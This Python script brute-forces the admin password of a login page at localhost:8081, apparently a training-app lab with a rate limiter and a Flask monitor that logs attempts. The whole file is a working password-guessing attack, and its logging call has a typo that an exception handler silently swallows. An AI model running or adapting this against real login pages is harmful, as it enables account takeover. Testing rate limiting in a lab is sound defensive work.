#!/usr/bin/env python3
import itertools
import string
import time
import argparse

import requests


def gen_passwords(charset: str, min_len: int, max_len: int):
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield "".join(combo)


def main():
    parser = argparse.ArgumentParser(
        description="Bruteforce for safe_auth (/vulnerabilities/brute/ on 8081)"
    )
    parser.add_argument(
        "--url",
        default="http://localhost:8081/vulnerabilities/brute/",
        help="Target URL (safe_auth)",
    )
    parser.add_argument(
        "--username",
        default="admin",
        help="Username to bruteforce for",
    )
    parser.add_argument(
        "--charset",
        default="ab12",
        help="Characters to use for password generation",
    )
    parser.add_argument(
        "--min-len",
        type=int,
        default=1,
        help="Minimum password length",
    )
    parser.add_argument(
        "--max-len",
        type=int,
        default=4,
        help="Maximum password length",
    )
    parser.add_argument(
        "--log-url",
        default="http://localhost:5000/attempts",
        help="Flask monitor endpoint for logging attempts",
    )
    args = parser.parse_args()

    session = requests.Session()

    print(f"[*] Target: {args.url}")
    print(f"[*] Username: {args.username}")
    print(f"[*] Charset: {args.charset!r}, length {len(args.charset)}")
    print(f"[*] Lengths: {args.min_len}..{args.max_len}")
    print(f"[*] Logging attempts to: {args.log_url}")
    print()

    start_time = time.time()
    tried = 0

    for pwd in gen_passwords(args.charset, args.min_len, args.max_len):
        tried += 1

        params = {
            "username": args.username,
            "password": pwd,
            "user_token": "1",  # как в app_auth.py
            "Login": "1",
        }

        resp = session.get(args.url, params=params, timeout=5)

        # логирование попытки в Flask-монитор
        try:
            r_log = request.post(
                args.log_url,
                json={
                    "username": args.username,
                    "password": pwd,
                    "success": resp.status_code == 200
                    and "Welcome to the password protected area" in resp.text,
                    "source": "safe_auth_bruteforce",
                },
                timeout=2,
            )
            print(f"[*] Log response status: {r_log.status_code}")
        except Exception:
            pass

        if resp.status_code == 429:
            print(
                f"[!] Got 429 Too Many Requests (blocked) on password={pwd!r}, "
                f"stopping bruteforce."
            )
            break

        if resp.status_code == 400 and "Login parameter is required" in resp.text:
            print(
                "[!] Server says 'Login parameter is required' — "
                "проверь, что мы отправляем параметр Login=1."
            )
            break

        if resp.status_code == 200 and "Welcome to the password protected area" in resp.text:
            elapsed = time.time() - start_time
            print(f"[+] SUCCESS: password for {args.username!r} is {pwd!r}")
            print(f"[*] Tried {tried} passwords in {elapsed:.2f}s")
            return

        # Можно вывести прогресс раз в 100=N попыток
        if tried % 100 == 0:
            elapsed = time.time() - start_time
            speed = tried / elapsed if elapsed > 0 else 0
            print(f"[*] Tried {tried} passwords, elapsed {elapsed:.1f}s, speed {speed:.1f} pwd/s")

    else:
        elapsed = time.time() - start_time
        print(f"[-] Password not found, tried {tried} passwords in {elapsed:.2f}s")


if __name__ == "__main__":
    main()

